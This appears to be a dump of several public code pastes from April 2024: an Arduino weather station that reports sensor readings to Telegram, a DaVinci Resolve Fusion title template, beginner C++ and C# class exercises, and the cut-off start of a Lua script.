0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,};
"
hCc7bdWQ,Stazione Meteo Arduino V1.0,overvolt,C++,Tuesday 23rd of April 2024 10:45:21 AM CDT,"
// E-INK
#include <GxEPD.h>
#include <GxIO/GxIO_SPI/GxIO_SPI.h>
#include <GxIO/GxIO.h>
#include <GxGDEH0154D67/GxGDEH0154D67.h>

#include ""bitmap.h""

#include <Fonts/FreeSansBold18pt7b.h>     //FONT SANS BOL 18P
#include <Fonts/FreeSansBold24pt7b.h>     //FONT SANS BOL 24P

GxIO_Class io(SPI, 10, 9, 8);   // CREO SERIALE PER E-INK -- CS DC RST
GxEPD_Class display(io, 8, 7);  // CREO DISPLAY PER E-INK -- Seriale RST BUSY


// WIFI E TELEGRAM
#include <WiFi.h>
#include <WiFiClientSecure.h>
#include <UniversalTelegramBot.h>

const char* ssid = ""arduinooo"";
const char* password = ""arduinami"";

#define BOTToken ""xxxxx""
#define CHAT_ID ""xxxxx""

WiFiClientSecure client;
UniversalTelegramBot bot(BOTToken, client);


// SENSORI
#include ""DHT.h""
#include ""MQ135.h""

MQ135 mq135_sensor(A1);
DHT dht(2, DHT11);

float t, h, PPM;



void setup() {
  Serial.begin(115200);
  display.init();
  display.setRotation(2);

  dht.begin();

  WiFi.mode(WIFI_STA);

  splash();
}


void loop() {
  lettura_sensori();
  stampa_valori();
  messaggio();
  delay(3600000);
}


void splash() {
  display.eraseDisplay();                                       //SVUOTO DISPLAY
  display.drawExampleBitmap(logo, 0, 0, 200, 200, GxEPD_BLACK); //SETTO IL LOGO 
  display.update();                                             //STAMPO
  delay(3000);                                                  //ASPETTO 3 SEC

  display.drawExampleBitmap(gui, 0, 0, 200, 200, GxEPD_BLACK);
  display.update();                                             //STAMPO
}


void lettura_sensori() {
  t = dht.readTemperature();
  h = dht.readHumidity();
  PPM = mq135_sensor.getCorrectedPPM(t, h);
}


void stampa_valori() {
  display.setRotation(3);
  display.fillRect(65,0,135,200, GxEPD_WHITE);

  display.setFont(&FreeSansBold24pt7b);
  display.setTextColor(GxEPD_BLACK);

  display.setCursor(65,50);
  display.print(String(t,1));

  display.setCursor(65,115);
  display.print(String(h,0) + ""%"");

  display.setCursor(65,180);
  if (PPM > 100000) display.setFont(&FreeSansBold18pt7b);
  display.print(String(PPM,0));

  display.update();
}


void messaggio() {
  WiFi.begin(ssid, password);
  client.setCACert(TELEGRAM_CERTIFICATE_ROOT);

  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(""."");
  }
  Serial.println("""");
  Serial.println(""WiFi connesso"");

  bot.sendMessage(CHAT_ID, ""\xf0\x9f\x8c\xa1 "" + String(t,1) + ""°C \n \xf0\x9f\x92\xa7 "" + String(h,0) + ""% \n \xf0\x9f\x92\xa8 "" + String(PPM,0) + "" PPM"");  //invia il messaggio
  
  WiFi.disconnect(true);
  WiFi.mode(WIFI_OFF);
}
"
sxy7Erbw,Brackets,marcusa3000,Lua,Tuesday 23rd of April 2024 10:43:02 AM CDT,"{
	Tools = ordered() {
		DarkBoxText = GroupOperator {
			CtrlWZoom = false,
			CustomData = {
				Path = {
					Map = {
						[""Setting:""] = ""/Applications/DaVinci Resolve Studio.app/Contents/Resources/Fusion/Templates/Templates.drfx/Edit/Titles/""
					}
				},
			},
			Inputs = ordered() {
				Input6 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""StyledText"",
				},
				Input7 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""Font"",
					ControlGroup = 4,
				},
				Input8 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""Style"",
					ControlGroup = 4,
				},
				Input9 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""Red1Clone"",
					Name = ""Color"",
					ControlGroup = 5,
					Default = 1,
				},
				Input10 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""Green1Clone"",
					ControlGroup = 5,
					Default = 1,
				},
				Input11 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""Blue1Clone"",
					ControlGroup = 5,
					Default = 1,
				},
				Input12 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""Alpha1Clone"",
					ControlGroup = 5,
					Default = 1,
				},
				Input13 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""Size"",
					Default = 0.0591,
				},
				Input14 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""CharacterSpacingClone"",
					Name = ""Tracking"",
					Default = 1,
				},
				Input15 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""LineSpacingClone"",
					Default = 1,
				},
				Input16 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""Strikeout"",
					Name = ""Emphasis"",
					ControlGroup = 9,
				},
				Input17 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""Underline"",
					Name = ""Emphasis"",
					ControlGroup = 9,
				},
				Input1 = InstanceInput {
					SourceOp = ""Transform4"",
					Source = ""Center"",
					Name = ""Position"",
				},
				LineColor = InstanceInput {
					SourceOp = ""LineColor"",
					Source = ""LineColor"",
					Page = ""Controls"",
				},
				Input2 = InstanceInput {
					SourceOp = ""LineColor"",
					Source = ""TopLeftRed"",
					Name = ""Color"",
					ControlGroup = 2,
					Default = 0.8270000219345,
				},
				Input3 = InstanceInput {
					SourceOp = ""LineColor"",
					Source = ""TopLeftGreen"",
					ControlGroup = 2,
					Default = 0.5934485793114,
				},
				Input4 = InstanceInput {
					SourceOp = ""LineColor"",
					Source = ""TopLeftBlue"",
					ControlGroup = 2,
					Default = 0.1149529963732,
				},
				Input5 = InstanceInput {
					SourceOp = ""LineColor"",
					Source = ""TopLeftAlpha"",
					ControlGroup = 2,
					Default = 1,
				}
			},
			Outputs = {
				Output2 = InstanceOutput {
					SourceOp = ""Path5"",
					Source = ""Heading"",
				},
				MainOutput1 = InstanceOutput {
					SourceOp = ""KeyframeStretcher1"",
					Source = ""Result"",
				},
				Output1 = InstanceOutput {
					SourceOp = ""Path6"",
					Source = ""Heading"",
				}
			},
			ViewInfo = GroupInfo {
				Pos = { 220, 49.5 },
				Flags = {
					Expanded = true,
					AllowPan = false,
					ConnectedSnap = true,
					AutoSnap = true,
					RemoveRouters = true
				},
				Size = { 714.18, 414.966, 357.09, 36.2677 },
				Direction = ""Horizontal"",
				PipeStyle = ""Direct"",
				Scale = 1,
				Offset = { 0, 0 }
			},
			Tools = ordered() {
				KeyframeStretcher1 = KeyStretcher {
					Inputs = {
						Keyframes = Input {
							SourceOp = ""Transform4"",
							Source = ""Output"",
						},
						SourceEnd = Input { Value = 125, },
						StretchStart = Input { Value = 46, },
						StretchEnd = Input { Value = 88, },
					},
					ViewInfo = OperatorInfo { Pos = { 294, 329.722 } },
				},
				Transform4 = Transform {
					Inputs = {
						Input = Input {
							SourceOp = ""Merge5"",
							Source = ""Output"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { 144.178, 329.722 } },
				},
				Merge5 = Merge {
					Inputs = {
						Blend = Input {
							SourceOp = ""Merge5Blend"",
							Source = ""Value"",
						},
						Background = Input {
							SourceOp = ""LineColor"",
							Source = ""Output"",
						},
						Foreground = Input {
							SourceOp = ""ChannelBooleans3"",
							Source = ""Output"",
						},
						PerformDepthMerge = Input { Value = 0, },
					},
					ViewInfo = OperatorInfo { Pos = { 3.77002, 329.722 } },
				},
				Merge5Blend = BezierSpline {
					SplineColor = { Red = 205, Green = 205, Blue = 205 },
					CtrlWZoom = false,
					KeyFrames = {
						[17] = { 0, RH = { 23, 0.333333333333333 }, Flags = { Linear = true } },
						[35] = { 1, LH = { 29, 0.666666666666667 }, RH = { 53.3333333333333, 1 }, Flags = { Linear = true } },
						[90] = { 1, LH = { 71.6666666666667, 1 }, RH = { 96, 0.666666666666667 }, Flags = { Linear = true } },
						[108] = { 0, LH = { 102, 0.333333333333333 }, Flags = { Linear = true } }
					}
				},
				ChannelBooleans3 = ChannelBoolean {
					Inputs = {
						EffectMask = Input {
							SourceOp = ""Instance_Text1_1_1_1"",
							Source = ""Output"",
						},
						MultiplyByMask = Input { Value = 1, },
						Background = Input {
							SourceOp = ""Transform3"",
							Source = ""Output"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { -106.23, 329.722 } },
				},
				Instance_Text1_1_1_1 = TextPlus {
					ExtentSet = true,
					SourceOp = ""Text"",
					Inputs = {
						Softness6 = Input { },
						Properties6 = Input { },
						Size6 = Input { },
						Shear6 = Input { },
						Position6 = Input { },
						Rotation6 = Input { },
						EffectMask = Input { },
						SettingsNest = Input { },
						ImageNest = Input { },
						[""Gamut.ColorSpaceNest""] = Input { },
						[""Gamut.GammaSpaceNest""] = Input { },
						Layout = Input { },
						LayoutRotation = Input { },
						Background = Input { },
						TransformTransform = Input { },
						TransformRotation = Input { },
						TransformShear = Input { },
						TransformSize = Input { },
						Enabled1 = Input { Value = 0, },
						Enabled6 = Input { },
						Properties1 = Input { },
						Softness1 = Input { },
						Position1 = Input { Value = 1, },
						Rotation1 = Input { },
						Shear1 = Input { },
						Size1 = Input { },
						TextText = Input { },
						TabSpacing = Input { },
						AdvancedFontControls = Input { },
						ClearSelectedKerning = Input { },
						ClearAllKerning = Input { },
						ClearSelectedPlacement = Input { },
						ClearAllPlacement = Input { },
						Internal = Input { },
						CommentsNest = Input { },
						FrameRenderScriptNest = Input { },
						StartRenderScripts = Input { },
						EndRenderScripts = Input { },
						Properties4 = Input { },
						Alpha4 = Input { },
						Softness4 = Input { },
						Position4 = Input { Value = 1, },
						Rotation4 = Input { },
						Shear4 = Input { },
						Size4 = Input { },
						Properties5 = Input { },
						Softness5 = Input { },
						Position5 = Input { Value = 1, },
						Rotation5 = Input { },
						Shear5 = Input { },
						Size5 = Input { },
					},
					ViewInfo = OperatorInfo { Pos = { -106.23, 279.425 } },
				},
				LineColor = Background {
					ExtentSet = true,
					NameSet = true,
					CustomData = {
						Settings = {
						}
					},
					Inputs = {
						EffectMask = Input {
							SourceOp = ""Bitmap1"",
							Source = ""Mask"",
						},
						GlobalOut = Input { Value = 500, },
						Width = Input { Value = 1920, },
						Height = Input { Value = 1088, },
						UseFrameFormatSettings = Input { Value = 1, },
						[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
						TopLeftRed = Input { Value = 1, },
						TopLeftBlue = Input { Value = 0.228, },
						LineColor = Input { Value = 1, }
					},
					ViewInfo = OperatorInfo { Pos = { 3.77002, 250.145 } },
					UserControls = ordered() { LineColor = { INP_Integer = false, LBLC_DropDownButton = true, LINKID_DataType = ""Number"", LBLC_NumInputs = 4, INPID_InputControl = ""LabelControl"", LINKS_Name = ""Line Color"", } }
				},
				Merge4 = Merge {
					Inputs = {
						Background = Input {
							SourceOp = ""ChannelBooleans1"",
							Source = ""Output"",
						},
						Foreground = Input {
							SourceOp = ""ChannelBooleans1"",
							Source = ""Output"",
						},
						FlipHoriz = Input { Value = 1, },
						PerformDepthMerge = Input { Value = 0, },
					},
					ViewInfo = OperatorInfo { Pos = { 3.77002, 160.806 } },
				},
				Transform3 = Transform {
					Inputs = {
						Center = Input {
							SourceOp = ""Path6"",
							Source = ""Position"",
						},
						Input = Input {
							SourceOp = ""Text"",
							Source = ""Output"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { -294.18, 329.722 } },
				},
				Path6 = PolyPath {
					DrawMode = ""InsertAndModify"",
					CtrlWZoom = false,
					Inputs = {
						Displacement = Input {
							SourceOp = ""Path6Displacement"",
							Source = ""Value"",
						},
						PolyLine = Input {
							Value = Polyline {
								Points = {
									{ Linear = true, LockY = true, X = 0, Y = -0.5, RX = 0, RY = 0.166666666666667 },
									{ Linear = true, LockY = true, X = 0, Y = 0, LX = 0, LY = -0.166666666666667 }
								}
							},
						},
					},
				},
				Path6Displacement = BezierSpline {
					SplineColor = { Red = 255, Green = 0, Blue = 255 },
					CtrlWZoom = false,
					KeyFrames = {
						[17] = { 0, RH = { 32.8181818181818, 0 }, Flags = { LockedY = true } },
						[46] = { 1, LH = { 22.6644620811287, 1 }, RH = { 59.9985997676849, 1 }, Flags = { LockedY = true } },
						[88] = { 1, LH = { 74.0014002323151, 1 }, RH = { 97.665699839592, 1 } },
						[117] = { 0, LH = { 107.334300160408, 0 } }
					}
				},
				Text = TextPlus {
					ExtentSet = true,
					NameSet = true,
					Inputs = {
						Offset3 = Input {
							Value = Point {
								X = 0,
								Y = -0.077
							},
						},
						ExtendVertical3 = Input { Value = 0.19, },
						Level3 = Input { Value = 2, },
						ElementShape3 = Input { Value = 2, },
						ExtendHorizontal3 = Input { Value = 1.17, },
						Position3 = Input { Value = 1, },
						GlobalOut = Input { Value = 500, },
						Width = Input { Value = 1920, },
						Height = Input { Value = 1088, },
						UseFrameFormatSettings = Input { Value = 1, },
						[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
						CharacterSpacing = Input { Value = 1.102, },
						SelectElement = Input { Value = 5, },
						Select = Input { Value = 3, },
						Name3 = Input { Value = ""BlackBG Mask"", },
						Name4 = Input { Value = ""Black BG"", },
						Enabled4 = Input { Value = 1, },
						Name5 = Input { Value = ""OrangeMask"", },
						Enabled5 = Input { Value = 1, },
						Name6 = Input { Value = ""Orange"", },
						Enabled6 = Input { Value = 1, },
						Thickness1 = Input { Value = 0.0882, },
						ExtendHorizontal1 = Input { Value = 0.95, },
						ExtendVertical1 = Input { Value = 0.16, },
						Position1 = Input { Value = 1, },
						StyledText = Input { Value = ""Just\nCrop\nIt"", },
						Font = Input { Value = ""Open Sans"", },
						Style = Input { Value = ""Semibold"", },
						Size = Input { Value = 0.0709, },
						VerticalJustificationNew = Input { Value = 3, },
						HorizontalJustificationNew = Input { Value = 3, },
						Level4 = Input { Value = 0, },
						ExtendHorizontal4 = Input { Value = 0.6, },
						ExtendVertical4 = Input { Value = 0.03, },
						Blue4 = Input { Value = 0, },
						Alpha4 = Input { Value = 0.551, },
						Position4 = Input { Value = 1, },
						ElementShape5 = Input { Value = 2, },
						Level5 = Input { Value = 0, },
						ExtendHorizontal5 = Input { Value = 0.59, },
						Red5 = Input { Value = 0, },
						Green5 = Input { Value = 0, },
						Blue5 = Input { Value = 0, },
						Alpha5 = Input { Value = 0, },
						Position5 = Input { Value = 1, },
						ElementShape6 = Input { Value = 2, },
						Level6 = Input { Value = 0, },
						ExtendHorizontal6 = Input { Value = 0.72, },
						ExtendVertical6 = Input { Value = 0.16, },
						Red6 = Input { Value = 0.8270000219345, },
						Green6 = Input { Value = 0.5934485793114, },
						Blue6 = Input { Value = 0.1149529963732, },
					},
					ViewInfo = OperatorInfo { Pos = { -294.18, 89.6366 } },
				},
				Rectangle4 = RectangleMask {
					Inputs = {
						Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
						MaskWidth = Input { Value = 1920, },
						MaskHeight = Input { Value = 1080, },
						PixelAspect = Input { Value = { 1, 1 }, },
						ClippingMode = Input { Value = FuID { ""None"" }, },
						Center = Input { Value = { 0, 0.5 }, },
						Width = Input { Value = 1, },
						Height = Input { Value = 1, },
					},
					ViewInfo = OperatorInfo { Pos = { 143.402, 100.054 } },
				},
				ChannelBooleans1 = ChannelBoolean {
					Inputs = {
						EffectMask = Input {
							SourceOp = ""Rectangle4"",
							Source = ""Mask"",
						},
						ApplyMaskInverted = Input { Value = 1, },
						MultiplyByMask = Input { Value = 1, },
						Background = Input {
							SourceOp = ""Transform2"",
							Source = ""Output"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { 3.77002, 100.054 } },
				},
				Transform2 = Transform {
					Inputs = {
						Center = Input {
							SourceOp = ""Path5"",
							Source = ""Position"",
						},
						Input = Input {
							SourceOp = ""Instance_Text1_1_1"",
							Source = ""Output"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { 3.77002, 48.5795 } },
				},
				Path5 = PolyPath {
					DrawMode = ""InsertAndModify"",
					CtrlWZoom = false,
					Inputs = {
						Displacement = Input {
							SourceOp = ""Path5Displacement"",
							Source = ""Value"",
						},
						PolyLine = Input {
							Value = Polyline {
								Points = {
									{ Linear = true, LockY = true, X = -0.5, Y = 0, RX = 0.166666666666667, RY = 0 },
									{ Linear = true, LockY = true, X = 0, Y = 0, LX = -0.166666666666667, LY = 0 }
								}
							},
						},
					},
				},
				Path5Displacement = BezierSpline {
					SplineColor = { Red = 255, Green = 0, Blue = 255 },
					CtrlWZoom = false,
					KeyFrames = {
						[2] = { 0, RH = { 18.4040404040404, 0 }, Flags = { LockedY = true } },
						[31] = { 1, LH = { 10.7, 1 }, RH = { 52.6644996404648, 1 }, Flags = { LockedY = true } },
						[96] = { 1, LH = { 74.3355003595352, 1 }, RH = { 105.665699839592, 1 } },
						[125] = { 0, LH = { 115.334300160408, 0 } }
					}
				},
				Instance_Text1_1_1 = TextPlus {
					ExtentSet = true,
					SourceOp = ""Text"",
					Inputs = {
						Shear4 = Input { },
						Position4 = Input { Value = 1, },
						Properties4 = Input { },
						Softness4 = Input { },
						Size4 = Input { },
						Rotation4 = Input { },
						EffectMask = Input {
							SourceOp = ""Rectangle3"",
							Source = ""Mask"",
						},
						SettingsNest = Input { },
						ImageNest = Input { },
						[""Gamut.ColorSpaceNest""] = Input { },
						[""Gamut.GammaSpaceNest""] = Input { },
						Layout = Input { },
						LayoutRotation = Input { },
						Background = Input { },
						TransformTransform = Input { },
						TransformRotation = Input { },
						TransformShear = Input { },
						TransformSize = Input { },
						Enabled1 = Input { Value = 0, },
						Enabled4 = Input { },
						Properties1 = Input { },
						Softness1 = Input { },
						Position1 = Input { Value = 1, },
						Rotation1 = Input { },
						Shear1 = Input { },
						Size1 = Input { },
						TextText = Input { },
						TabSpacing = Input { },
						AdvancedFontControls = Input { },
						ClearSelectedKerning = Input { },
						ClearAllKerning = Input { },
						ClearSelectedPlacement = Input { },
						ClearAllPlacement = Input { },
						Internal = Input { },
						CommentsNest = Input { },
						FrameRenderScriptNest = Input { },
						StartRenderScripts = Input { },
						EndRenderScripts = Input { },
						Properties5 = Input { },
						Softness5 = Input { },
						Position5 = Input { Value = 1, },
						Rotation5 = Input { },
						Shear5 = Input { },
						Size5 = Input { },
						Properties6 = Input { },
						Red6 = Input { },
						Green6 = Input { },
						Blue6 = Input { },
						Softness6 = Input { },
						Position6 = Input { },
						Rotation6 = Input { },
						Shear6 = Input { },
						Size6 = Input { },
					},
					ViewInfo = OperatorInfo { Pos = { 3.77002, 7.9451 } },
				},
				Rectangle3 = RectangleMask {
					Inputs = {
						Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
						Invert = Input { Value = 1, },
						MaskWidth = Input { Value = 1920, },
						MaskHeight = Input { Value = 1080, },
						PixelAspect = Input { Value = { 1, 1 }, },
						ClippingMode = Input { Value = FuID { ""None"" }, },
						Center = Input { Value = { 0, 0.5 }, },
						Width = Input { Value = 1, },
						Height = Input { Value = 1, },
					},
					ViewInfo = OperatorInfo { Pos = { -132.02, 7.9451 } },
				},
				Instance_Text = TextPlus {
					ExtentSet = true,
					NameSet = true,
					SourceOp = ""Text"",
					Inputs = {
						SettingsNest = Input { },
						ImageNest = Input { },
						[""Gamut.ColorSpaceNest""] = Input { },
						[""Gamut.GammaSpaceNest""] = Input { },
						Layout = Input { },
						LayoutRotation = Input { },
						Background = Input { },
						TransformTransform = Input { },
						TransformRotation = Input { },
						TransformShear = Input { },
						TransformSize = Input { },
						Enabled1 = Input { Value = 0, },
						Enabled4 = Input { },
						Enabled5 = Input { Value = 1, },
						Enabled6 = Input { },
						Properties1 = Input { },
						Softness1 = Input { },
						Position1 = Input { Value = 1, },
						Rotation1 = Input { },
						Shear1 = Input { },
						Size1 = Input { },
						TextText = Input { },
						TabSpacing = Input { },
						AdvancedFontControls = Input { },
						Internal = Input { },
						CommentsNest = Input { },
						FrameRenderScriptNest = Input { },
						StartRenderScripts = Input { },
						EndRenderScripts = Input { },
						Properties4 = Input { },
						Softness4 = Input { },
						Position4 = Input { Value = 1, },
						Rotation4 = Input { },
						Shear4 = Input { },
						Size4 = Input { },
						Properties5 = Input { },
						ExtendHorizontal5 = Input { Value = 0.38, },
						ExtendVertical5 = Input { Value = 1.59, },
						Red5 = Input { Value = 0, },
						Green5 = Input { Value = 0, },
						Blue5 = Input { Value = 0, },
						Alpha5 = Input { },
						Softness5 = Input { },
						Position5 = Input { Value = 1, },
						Rotation5 = Input { },
						Shear5 = Input { },
						Size5 = Input { },
						Properties6 = Input { },
						Red6 = Input { },
						Green6 = Input { },
						Blue6 = Input { },
						Softness6 = Input { },
						Position6 = Input { },
						Rotation6 = Input { },
						Shear6 = Input { },
						Size6 = Input { },
						EffectMask = Input { }
					},
					ViewInfo = OperatorInfo { Pos = { -110.669, 112.98 } },
				},
				Bitmap1 = BitmapMask {
					Inputs = {
						Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
						PaintMode = Input { Value = FuID { ""Subtract"" }, },
						Invert = Input { Value = 1, },
						MaskWidth = Input { Value = 1920, },
						MaskHeight = Input { Value = 1088, },
						PixelAspect = Input { Value = { 1, 1 }, },
						UseFrameFormatSettings = Input { Value = 1, },
						ClippingMode = Input { Value = FuID { ""None"" }, },
						Image = Input {
							SourceOp = ""Merge4"",
							Source = ""Output"",
						},
						Channel = Input { Value = FuID { ""Luminance"" }, },
						EffectMask = Input {
							SourceOp = ""Bitmap1_1"",
							Source = ""Mask"",
						}
					},
					ViewInfo = OperatorInfo { Pos = { 15.6112, 205.482 } },
				},
				Bitmap1_1 = BitmapMask {
					Inputs = {
						Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
						Invert = Input { Value = 1, },
						MaskWidth = Input { Value = 1920, },
						MaskHeight = Input { Value = 1088, },
						PixelAspect = Input { Value = { 1, 1 }, },
						UseFrameFormatSettings = Input { Value = 1, },
						ClippingMode = Input { Value = FuID { ""None"" }, },
						Image = Input {
							SourceOp = ""Instance_Text"",
							Source = ""Output"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { -93.3713, 185.132 } },
				}
			},
		}
	},
	ActiveTool = ""DarkBoxText""
}"
HtCVZx5A,Untitled,irmantas_radavicius,C++,Tuesday 23rd of April 2024 10:41:21 AM CDT,"#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <cmath>
#include <cctype>

using namespace std;


class Animal {
        string sound;
    public:
        Animal(string sound){
            this->sound = sound;
        }
        void makeSound(){
            cout << sound << endl;
        }
};
class Dog : public Animal {
    public:
        Dog(string sound = ""Woof!"")
            :Animal(sound)
        {
        }

};
class Cat : public Animal {
    public:
        Cat(string sound = ""Miaw!"")
            :Animal(sound)
        {
        }
};

int main(){

    Dog dog;
    dog.makeSound();

    Cat cat(""Mew!"");
    cat.makeSound();

    return 0;
}
"
h729yQbe,Untitled,irmantas_radavicius,C++,Tuesday 23rd of April 2024 10:10:25 AM CDT,"#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <cmath>
#include <cctype>

using namespace std;



class Account {
    private:
        double money;
        static int accessCount;

    public:
        Account(){
            //accessCount = 0;
            this->money = 0;
        }
        Account(double money){
            if(money > 0){
                ++accessCount;
                this->money = money;
            } else {
                this->money = 0;
            }
        }

        double in(double money){
            if (money > 0)
                accessCount++;
            //cout << money << "" "" << this->money << "" "" << ::money << endl;
            this->money += money;
            return this->money;
        }

        double out(double money){
            double t = min(money, this->money);
            this->money -= t;
            if(t > 0){
                accessCount++;
            }
            return t;
        }

        double get(){
            return money;
        }

        static int getAccessCount(){
            return accessCount;
        }

        void print(){
            cout << ""Account: "" << money << "" EUR "" << endl;
        }
};
int Account::accessCount = 0;



int main(){

    Account account1(0);
    account1.print();
    double a1 = account1.in(100);
    cout << ""Total "" << a1 << endl;
    account1.print();
    double b1 = account1.out(0);
    cout << ""Took out "" << b1 << endl;
    account1.print();
    cout << ""Total "" << account1.get() << endl;
    cout << ""Total transactions "" << Account::getAccessCount() << endl;

    cout << endl << endl;

    Account account2(0);
    account2.print();
    double a2 = account2.in(100);
    cout << ""Total "" << a2 << endl;
    account2.print();
    double b2 = account2.out(0);
    cout << ""Took out "" << b2 << endl;
    account2.print();
    cout << ""Total "" << account2.get() << endl;
    cout << ""Total transactions "" << Account::getAccessCount() << endl;

    return 0;
}
"
bdCmcdG6,Untitled,_KAGATUN_,C#,Tuesday 23rd of April 2024 10:06:14 AM CDT,"using System;
using System.Collections.Generic;

class Program
{
    static void Main(string[] args)
    {
        const string AddFish = ""1"";
        const string RemoveFish = ""2"";
        const string ExitCommand = ""3"";

        Aquarium aquarium = new Aquarium();

        bool isWork = true;

        while (isWork)
        {
            Console.WriteLine($""Максимально рыбок в аквариуме может быть {aquarium.Capacity}\n"");

            aquarium.ShowFishes();

            Console.WriteLine($""\nВведите {AddFish} чтобы добавить рыбку в аквариум"");
            Console.WriteLine($""\nВведите {RemoveFish} чтобы убрать рыбку из аквариума"");
            Console.WriteLine($""\nВведите {ExitCommand} чтобы закрыть программу"");

            string userInput = Console.ReadLine();

            Console.Clear();

            switch (userInput)
            {
                case AddFish:
                    aquarium.FillFishes();
                    break;

                case RemoveFish:
                    aquarium.RemoveFish();
                    break;

                case ExitCommand:
                    isWork = false;
                    break;

                default:
                    Console.WriteLine(""\nПрошёл год\n"");
                    break;
            }

            aquarium.AddAgeAll();

            Console.ReadKey();
            Console.Clear();
        }
    }
}

class Fish
{
    public Fish(string name, int maxAge)
    {
        Age = 0;
        Name = name;
        MaxAge = maxAge;
    }

    public string Name { get; protected set; }
    public int MaxAge { get; protected set; }
    public int Age { get; protected set; }

    public bool IsAlive => Age < MaxAge;

    public void ShowInfo()
    {
        Console.WriteLine($""Название рыбки {Name}. Максимальный возраст {MaxAge} лет."");
    }

    public void ShowFish()
    {
        if (IsAlive)
        {
            Console.WriteLine($""Рыбке {Name} лет {Age}."");
        }
        else
        {
            Console.WriteLine($""Рыбка {Name} мертва."");
        }
    }

    public void AddAge()
    {
        Age++;
    }
}

class Cardinal : Fish
{
    public Cardinal() : base(""Кардинал"", 4) { }
}

class Goldfish : Fish
{
    public Goldfish() : base(""Золотая рыбка"", 30) { }
}

class Severum : Fish
{
    public Severum() : base(""Северум"", 15) { }
}

class BlackLabeo : Fish
{
    public BlackLabeo() : base(""Чёрный лабео"", 7) { }
}

class SilverMetynnis : Fish
{
    public SilverMetynnis() : base(""Метиннис серебристый"", 8) { }
}

class Discus : Fish
{
    public Discus() : base(""Дискус"", 18) { }
}

class Aquarium
{
    private List<Fish> _fishes = new List<Fish>();

    public int Capacity { get; private set; } = 5;

    public void ShowFishes()
    {
        if (_fishes.Count > 0)
        {
            for (int i = 0; i < _fishes.Count; i++)
            {
                _fishes[i].ShowFish();
            }
        }
        else
        {
            Console.WriteLine(""Аквариум пустой"");
        }
    }

    public void AddAgeAll()
    {
        for (int i = 0; i < _fishes.Count; i++)
        {
            if (_fishes[i].IsAlive)
            {
                _fishes[i].AddAge();
            }
        }
    }

    public void RemoveFish()
    {
        if (_fishes.Count > 0)
        {
            for (int i = 0; i < _fishes.Count; i++)
            {
                Console.WriteLine((i + 1) + ""№ "");
                _fishes[i].ShowFish();
            }

            Console.WriteLine(""\nВведите номер рыбки для её удаления\n"");
            string number = Console.ReadLine();

            int index = ValidateIndex(number, _fishes.Count);

            if (index != -1)
            {
                _fishes.RemoveAt(index - 1);
                Console.WriteLine(""\nРыбка удалена\n"");
            }            
        }
        else
        {
            Console.WriteLine(""Аквариум пустой"");
        }      
    }

    public void FillFishes()
    {
        if (Capacity > _fishes.Count)
        {
            _fishes.Add(FillFish());
            Console.WriteLine(""\nРыбка добавлена"");
        }
        else
        {
            Console.WriteLine(""Аквариум заполнен"");
        }
    }

    private Fish FillFish()
    {
        List<Fish> fishes = new List<Fish> 
        {
            new Cardinal (),
            new Goldfish(),
            new Severum(),
            new BlackLabeo(),
            new SilverMetynnis(),
            new Discus() 
        };

        for (int i = 0; i < fishes.Count; i++)
        {
            Console.WriteLine((i + 1) + ""№ "");
            fishes[i].ShowInfo();
        }

        Fish selectedFish = null;

        Console.WriteLine(""\nВведите номер рыбки для добавления"");

        bool isWorks = true;

        while (isWorks)
        {
            string number = Console.ReadLine();
            int index = ValidateIndex(number, fishes.Count);

            if (index != -1)
            {
                selectedFish = fishes[index - 1];

                return selectedFish;
            }
        }

        return selectedFish;
    }

    private int ValidateIndex(string inputNumber, int maxValue)
    {
        int incorrectNumber = -1;

        if (int.TryParse(inputNumber, out int index))
        {
            if (index > 0 && index <= maxValue)
            {
                return index;
            }
        }

        Console.WriteLine(""\nРыбки под таким номером нет\n"");
        return incorrectNumber;
    }
}

"
eCSWwvLS,sgjourney Stargate Type test,PerryExtra,Lua,Tuesday 23rd of April 2024 10:02:18 AM CDT,"INTERFACE_TYPES = {
    ""basic_interface"",
